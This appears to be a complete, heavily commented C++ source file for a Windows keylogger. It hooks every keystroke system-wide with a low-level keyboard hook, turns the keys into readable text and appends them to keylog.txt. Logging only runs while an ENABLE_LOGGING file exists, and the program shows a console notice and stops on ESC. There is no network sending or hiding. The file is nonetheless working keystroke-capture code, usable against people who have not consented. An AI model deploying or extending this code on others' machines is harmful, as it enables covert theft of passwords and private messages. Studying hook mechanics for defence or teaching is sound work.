/*
compile: g++ -o keylogger keylogger.cpp -luser32
*/

#include <windows.h>
#include <fstream>
#include <filesystem>
#include <mutex>
#include <atomic>
#include <string>
#include <sstream>
#include <iomanip>

// Globals
static HHOOK hook_handler = nullptr; // hook container variable for our hook handler
static std::mutex log_mutex; // binary mutex for the keylog.txt file
static std::atomic<bool> hook_active(true); // atomic control flag for main message loop
static DWORD main_thread_id = 0; // safes current thread id

// File definitions
static const char* LOG_FILENAME = "keylog.txt";
static const char* ENABLE_FILENAME = "ENABLE_LOGGING";


/*
Converts a virtual_key message to a valid string readable by humans
*/
static std::string vk_to_string(DWORD vkCode, DWORD scanCode, bool isExtended)
{
    // handle special keys
    switch (vkCode) {
        case VK_SPACE:      return "[SPACE]";
        case VK_RETURN:     return "[ENTER]";
        case VK_BACK:       return "[BACKSPACE]";
        case VK_TAB:        return "[TAB]";
        case VK_ESCAPE:     return "[ESC]";
        case VK_SHIFT:      return "[SHIFT]";
        case VK_LSHIFT:     return "[L-SHIFT]";
        case VK_RSHIFT:     return "[R-SHIFT]";
        case VK_CONTROL:    return "[CTRL]";
        case VK_LCONTROL:   return "[L-CTRL]";
        case VK_RCONTROL:   return "[R-CTRL]";
        case VK_MENU:       return "[ALT]";
        case VK_LMENU:      return "[L-ALT]";
        case VK_RMENU:      return "[R-ALT]";
        case VK_CAPITAL:    return "[CAPSLOCK]";
        case VK_DELETE:     return "[DEL]";
        case VK_HOME:       return "[HOME]";
        case VK_END:        return "[END]";
        case VK_PRIOR:      return "[PAGE_UP]";
        case VK_NEXT:       return "[PAGE_DOWN]";
        case VK_INSERT:     return "[INS]";
        case VK_LEFT:       return "[LEFT]";
        case VK_RIGHT:      return "[RIGHT]";
        case VK_UP:         return "[UP]";
        case VK_DOWN:       return "[DOWN]";
        default: break;
    }

    // for function keys (f1 to f12 mostly)
    /*
    E.g.: F5 = VK_F5 = 0x74 = 116
    VK_F5-VK_F1 = 4 + 1 = 5
    */
    if (vkCode >= VK_F1 && vkCode <= VK_F24) {
        std::ostringstream o;
        o << "[F" << (vkCode - VK_F1 + 1) << "]";
        return o.str();
    }

    // get keyboard states
    BYTE keyboardState[256]; // 256 Bytes, 1/per key on keyboard
    // https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeyboardstate
    /*
    Every byte for an current state of a dedicated key
    --> 0x00 = key not pressed
    --> 0x80 = key pressed
    --> other bits for toggles (e.g. caps lock)

    Index of array stands for virtual_key code (e.g. 0x10 for VK_SHIFT; 0x41 for "A")
    */
    if (!GetKeyboardState(keyboardState)) { // fill array with current keyboard state
        return "[?]";
    }


    // scan code = physical (number the keyboard controller sends when being pressed) --> position and key kind (not the logical expression!)
    /*
    Example:
        - A = 0x1E
        - Enter (normal) = 0x1C
        - Enter (on numpad) = 0x1C + extended_flag

    KF_EXTENDED = const. with bitflag: 0x0100 = 8th bit set [signalises that the key is an extended key]
    --> e.g. set for arrow_keys, right ctrl/alt, numpad-enter, insert, delete, home, ...
    */
    UINT scan = scanCode;
    if (isExtended) scan |= KF_EXTENDED;    // if we have info, that key is extended key --> set the extended-key-bit in the scan code (with |= KF_EXTENDED)



    WCHAR buf[16] = {0}; // init stack-buffer for utf-16 code units (wide char = 16-bit) && initialize all fields with '\0'

    // layout decides, how VK_* + modifiers (e.g. capslock) result in a valid unicode character
    HKL layout = GetKeyboardLayout(0); // get current layout: https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeyboardlayout

    // https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-tounicodeex
    int res = ToUnicodeEx(vkCode, scanCode, keyboardState, buf, ARRAYSIZE(buf), 0, layout);
    if (res > 0) {
        // convert wide char to utf-8 string
        // https://learn.microsoft.com/en-us/windows/win32/api/stringapiset/nf-stringapiset-widechartomultibyte
        int needed = WideCharToMultiByte(CP_UTF8, 0, buf, res, nullptr, 0, nullptr, nullptr);
        if (needed > 0) {
            std::string out(needed, '\0');
            WideCharToMultiByte(CP_UTF8, 0, buf, res, out.data(), needed, nullptr, nullptr);
            return out;
        }
    }

    // backup fallback: when no visible character was created, write the hex value of the virtual key
    // executed in local scope
    {
        std::ostringstream o;
        o << "[VK_" << std::hex << std::uppercase << vkCode << "]";
        return o.str();
    }
}


/*
Write to the file and lock it with a mutex
*/
static void safe_log_append(const std::string& text)
{
    // if keyfile not in dir: leave
    if (!std::filesystem::exists(ENABLE_FILENAME)) return;

    // lock the file
    std::lock_guard<std::mutex> lock(log_mutex);
    std::ofstream ofs(LOG_FILENAME, std::ios::app | std::ios::binary);
    if (!ofs.is_open()) return;

    // append the file and flush
    ofs << text;
    ofs.flush();
} // after scope is left, the mutex is unlocked automatically with: log_mutex.unlock()

// https://learn.microsoft.com/en-us/windows/win32/winmsg/lowlevelkeyboardproc
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    // WM_KEYDOWN = normal key || WM_SYSKEYDOWN = system key (e.g. alt)
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {

        // get struct from lParam pointer
        /*
        Source: https://learn.microsoft.com/en-us/windows/win32/api/winuser/ns-winuser-kbdllhookstruct

        typedef struct tagKBDLLHOOKSTRUCT {
            DWORD     vkCode;
            DWORD     scanCode;
            DWORD     flags;
            DWORD     time;
            ULONG_PTR dwExtraInfo;
        } KBDLLHOOKSTRUCT, *LPKBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT;
        // reinterpret_cast: compiler doesn't check for type compability
        // reinterpret integer value in lParam as pointer
        */
        KBDLLHOOKSTRUCT* pkb = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

        // extract key info
        // static_cast: compiler checks for type compability
        DWORD vk = static_cast<DWORD>(pkb->vkCode);
        DWORD scan = static_cast<DWORD>(pkb->scanCode);
        // flags is a bitmask, holding different information (e.g. 0x20 for LLKHF_ALTDOWN), if bitwise operation with & is successful: bool is set true
        bool isExtended = (pkb->flags & LLKHF_EXTENDED) != 0;

        // get readable string
        std::string s = vk_to_string(vk, scan, isExtended);

        // if ESCAPE: leave keylogger
        if (vk == VK_ESCAPE) {
            safe_log_append("[ESC]\n");

            // write false to hook_active --> signal stop of thread execution
            hook_active.store(false);

            if (main_thread_id != 0) {

                // post message to message queue of main thread
                PostThreadMessage(main_thread_id, WM_QUIT, 0, 0);
            }
        } else {
            // else safe written key
            safe_log_append(s);
            if (!s.empty() && s.front() == '[') {
                safe_log_append("\n");
            }
        }
    }

    /* hooks: action -> hookA (e.g. this function) -> hookB (maybe a hook from somewhere else) -> hookC -> ... -> System -> goalFunction
    when we do not call the next hook, the chain is broken and the goal program may not get the message
    instead of passing hook_handler: you can pass nullptr, this value is ignored anyways: https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-callnexthookex
    */
    return CallNextHookEx(hook_handler, nCode, wParam, lParam);
}


/*
Main-Function containing the main message loop
*/
int main()
{
    // store the main thread id
    main_thread_id = GetCurrentThreadId();

    /*
    Set the win-hook:
        https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa
    */
    hook_handler = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, nullptr, 0);
    if (!hook_handler) {
        MessageBoxA(NULL, "Failed to install keyboard hook. Run as normal user (no admin needed).", "Error", MB_OK | MB_ICONERROR);
        return 1;   // error while loading program
    }

    // First line of the keylogger
    std::string s = "[KEYLOGGER_STARTED]";
    safe_log_append(s);
            if (!s.empty() && s.front() == '[') {
                safe_log_append("\n");
            }


    // print instructions
    printf("Keylogger started. Logging only when \"%s\" exists in the current directory.\n", ENABLE_FILENAME);
    printf("Press ESC to stop.\n");

    // msg loop until ESC is hit
    MSG msg;
    // stop when hook_active.store(false) set by hook function
    while (hook_active.load()) {
        // read message queue
        BOOL ret = GetMessage(&msg, NULL, 0, 0);
        if (ret == -1) {
            // Error
            break;
        } else if (ret == 0) {
            // WM_QUIT received in msg
            break;
        }
    }

    // unhook the keyboard and remove from hook chain
    if (hook_handler) {
        UnhookWindowsHookEx(hook_handler);
        hook_handler = nullptr;
    }

    // message to keylogger file to signal end of logging
    if (std::filesystem::exists(ENABLE_FILENAME)) {
        std::lock_guard<std::mutex> lock(log_mutex);
        std::ofstream ofs(LOG_FILENAME, std::ios::app | std::ios::binary);
        if (ofs.is_open()) {
            ofs << "\n[KEYLOGGER_STOPPED]\n";
            ofs.close();
        }
    }

    // signal to console that logging stopped
    printf("Exiting cleanly...\n");
    return 0;
}
